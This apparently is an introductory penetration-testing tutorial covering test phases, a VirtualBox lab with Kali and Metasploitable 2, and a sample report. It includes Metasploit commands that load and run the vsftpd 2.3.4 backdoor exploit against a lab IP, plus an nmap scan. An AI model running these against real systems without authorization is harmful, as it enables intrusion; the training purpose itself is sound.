# Penetration Testing Methodology and Basic Ethical Hacking

# Introduction

Penetration testing is a controlled and authorized security assessment used to identify vulnerabilities in computer systems, networks, and applications. All testing must be performed only in a legal lab environment with permission.

---

# 1. Penetration Testing Phases

## 1. Reconnaissance

Information gathering about the target using public information, DNS records, WHOIS, and network discovery.

### Purpose

* Identify target systems
* Gather network information
* Discover potential attack surface

---

## 2. Scanning

Scanning identifies live hosts, open ports, services, and possible vulnerabilities.

### Common Tools

* Nmap
* Nessus
* OpenVAS

<img width="1907" height="955" alt="image" src="https://github.com/user-attachments/assets/f4d835b4-89eb-40c0-963a-f559830be1fc" />

---

## 3. Exploitation

This phase tests whether identified vulnerabilities can be exploited in an authorized environment.

### Purpose

* Verify vulnerabilities
* Demonstrate security impact

---

## 4. Post-Exploitation

After successful exploitation, the tester evaluates the impact and documents the level of access obtained.

### Activities

* Assess business impact
* Identify sensitive resources
* Recommend remediation

---

## 5. Reporting

The final report documents findings, severity, evidence, and recommendations for remediation.

---

# 2. Lab Setup

A safe penetration testing lab consists of:

* Oracle VirtualBox
* Kali Linux Virtual Machine
* Metasploitable 2 or DVWA Virtual Machine

## Lab Diagram

```text
Host Computer
│
├── VirtualBox
│     ├── Kali Linux
│     └── Metasploitable 2 / DVWA
```

<img width="1912" height="939" alt="image" src="https://github.com/user-attachments/assets/88d4bfd0-61e0-47bf-b5d7-7ec9b2898f1e" />

<img width="1901" height="954" alt="image" src="https://github.com/user-attachments/assets/2981c5d2-c400-4192-8cbe-f98622ed3239" />

<img width="1908" height="957" alt="image" src="https://github.com/user-attachments/assets/65066b6e-2cc5-4b5a-8163-99dcb174f0d0" />

---

# 3. Basic Metasploit Framework Commands

Start Metasploit:

```bash
msfconsole
```

Search for a module:

```bash
search vsftpd
```

Select a module:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Show required options:

```bash
show options
```

Set the target host:

```bash
set RHOSTS 192.168.1.100
```

Run the module:

```bash
run
```

> These commands are examples for an authorized lab environment only.

<img width="1908" height="956" alt="image" src="https://github.com/user-attachments/assets/984ca0ef-b255-4091-ae60-1920b67f4fe2" />

---

# 4. Basic Vulnerability Assessment

Example tool:

Nmap

Command:

```bash
nmap -sV 192.168.1.100
```

Example Findings

| Port | Service | Status |
| ---- | ------- | ------ |
| 21   | FTP     | Open   |
| 22   | SSH     | Open   |
| 80   | HTTP    | Open   |

---

# 5. Professional Penetration Testing Report

## Assessment Information

* Assessment Date:
* Tester:
* Target:
* Scope:
* Tools Used:

---

## Executive Summary

A basic vulnerability assessment was performed in an isolated lab environment. Several services were identified, and recommendations are provided to improve security.

---

## Findings

| Vulnerability              | Severity | Recommendation         |
| -------------------------- | -------- | ---------------------- |
| Open FTP Port              | Medium   | Disable if unnecessary |
| Weak Service Configuration | Medium   | Update software        |
| Outdated Packages          | High     | Apply latest patches   |

---

## Recommendations

* Keep operating systems updated.
* Disable unused services.
* Configure firewall rules.
* Use strong passwords.
* Enable multi-factor authentication.
* Perform regular vulnerability scans.

---

# 6. Legal and Ethical Considerations

Penetration testing must only be conducted:

* On personal lab environments
* On systems you own
* With written authorization
* Within approved scope

Unauthorized testing is illegal and unethical.

---

# Conclusion

Penetration testing is an important cybersecurity practice that helps organizations identify and fix security weaknesses before attackers can exploit them. A structured methodology and professional reporting improve the effectiveness of security assessments.
